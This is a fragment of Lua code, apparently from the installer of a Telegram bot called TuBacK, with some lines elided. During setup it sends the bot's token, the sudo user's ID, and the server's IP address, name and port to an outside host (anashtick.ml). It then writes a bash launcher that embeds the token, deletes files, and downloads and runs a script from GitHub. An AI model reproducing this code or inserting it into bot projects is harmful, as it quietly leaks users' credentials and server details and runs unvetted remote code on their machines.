...
data,res = https.request("http://anashtick.ml/info.php?bn=info&id="..Id)
if res == 200 then
...
local t = json:decode(https.request('http://anashtick.ml/info.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("TuBacK", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/TuBacK
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr TuBacK.lua
wget "https://raw.githubusercontent.com/TuBacK/TuBacK/master/TuBacK.lua"
while(true) do
rm -fr ../.telegram-cli
